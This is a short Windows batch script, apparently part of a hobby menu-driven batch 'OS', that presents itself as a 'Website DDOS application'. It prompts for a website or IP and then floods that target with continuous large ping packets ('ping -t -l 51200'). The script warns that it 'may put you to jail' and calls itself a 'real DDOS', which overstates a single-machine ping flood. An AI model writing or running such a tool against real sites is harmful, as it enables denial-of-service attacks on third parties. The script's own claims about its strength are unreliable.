@echo off
Title Website DDOS application
color 0e
cls
Echo You are using a real DDOS application which will DDOS a website or IP at 416Kbps
Echo This tool may put you to jail! Use with caution!
Echo Access this tool?
cmdmenusel f8%f0 "Yes" "Exit"
if %ERRORLEVEL% == 1 GOTO :start
if %ERRORLEVEL% == 2 call cls & cls & MainmenuMaxOS.bat
:start
cls
Echo So you want to use this tool? There you go.
cmdmenusel f8%f0 "Start DDOS" "Exit"
if %ERRORLEVEL% == 1 GOTO :DDOS
if %ERRORLEVEL% == 2 call cls & cls & MainmenuMaxOS.bat
:DDOS
cls
echo Enter the website you would like to DDOS
set input=
set /p input= Enter your Website here:
echo Processing Your request
echo To end DDOS press CTRL + C
ping localhost>nul
cls
echo ----------------------------------------------------------------------
echo Now DDOS Website...DO NOT CLOSE THIS BOX!! PRESS CRTL + C TO END!!
echo ----------------------------------------------------------------------
ping %input% -t -l 51200